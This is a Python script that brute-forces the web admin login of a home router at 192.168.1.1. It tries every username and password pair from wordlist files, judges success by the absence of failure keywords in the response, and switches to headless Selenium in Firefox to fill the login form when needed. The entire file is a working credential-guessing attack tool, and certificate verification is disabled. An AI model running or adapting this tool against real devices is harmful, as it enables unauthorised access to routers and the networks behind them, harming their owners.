# chmod +x /PATH-TO/selenium/webdriver/common/linux/selenium-manager

import requests
import sys
from requests_html import HTMLSession
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

url = "http://192.168.1.1" # Be sure about the router ip
expression = {b"failed", b"error", b"incorrect", b"failure", b"try", b"again", b"invalid", b"upgrade", b"outdated", b"browser", b"fail"}

def brute(username, password, combinations_tested, total_combinations, use_selenium=False):
    session = HTMLSession()
    try:
        a = session.post(url, data={'username': username, 'password': password}, verify=False)
        r_content = a.content.lower()
    except requests.exceptions.SSLError as e:
        print("SSL Error:", e)
        sys.exit(1)
    print("\n")
    combinations_tested += 1
    sys.stdout.write("\rCombinations tested: %d/%d" % (combinations_tested, total_combinations))
    sys.stdout.flush()

    if any(item in r_content for item in expression):
        print("\nUsing to Selenium with Firefox headless...")
        try:
            options = Options()
            options.headless = True
            driver = webdriver.Firefox(options=options)
            print("Firefox WebDriver started successfully")
            driver.get(url)
            print("Page loaded successfully")

            print("Waiting for username input field to be visible...")
            username_input = WebDriverWait(driver, 10).until(
                EC.visibility_of_element_located((By.ID, "txtUser")) # Be sure about the html id for the user input
            )
            print("Username input field found and visible")

            password_input = driver.find_element(By.ID, "txtPass") # Be sure about the html id for the password input
            username_input.send_keys(username)
            password_input.send_keys(password)

            try:
                submit_button = driver.find_element(By.ID, "btnLogin") # Be sure about the html id for the submit button
                submit_button.click()
            except Exception as e:
                print("Error clicking submit button:", e)
                password_input.submit()

            print("Form submission attempted")
            driver_lower_content = driver.page_source.lower().encode('utf-8')
            print("Page content after form submission:", driver_lower_content)
            
            if not any(item in driver_lower_content for item in expression):
                print("\nBrute Forcing...")
                print("[+] Username: ", username)
                print("[+] Password: ", password)
                print("Server Response:", driver.page_source.encode('utf-8'))
                sys.exit()
            else:
                print("Success condition not met")

        except KeyboardInterrupt:
            print("\n\033[91mExiting...\033[0m")
        except Exception as e:
            print("Error using Selenium:", e)
            sys.exit(1)
        finally:
            driver.quit()
            return combinations_tested
    elif not any(item in r_content for item in expression):
        print("\nBrute Forcing...")
        print("[+] Username: ", username)
        print("[+] Password: ", password)
        print("Server Response:", r_content)
        sys.exit()
    else:
        print("Upgrade condition not met")
        return combinations_tested

def main():
    combinations_tested = 0
    use_selenium = False
    usernames = [u.strip() for u in open("username.txt", "r").readlines()]
    passwords = [p.strip() for p in open("password.txt", "r").readlines()]
    total_combinations = len(usernames) * len(passwords)
    try:
        for username in usernames:
            for password in passwords:
                combinations_tested = brute(username, password, combinations_tested, total_combinations)
                if not use_selenium and b"upgrade" in requests.post(url, data={'username': username, 'password': password}, verify=False).content:
                    use_selenium = True
    except KeyboardInterrupt:
        print("\n\033[91mExiting...\033[0m")

if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings()
    main()
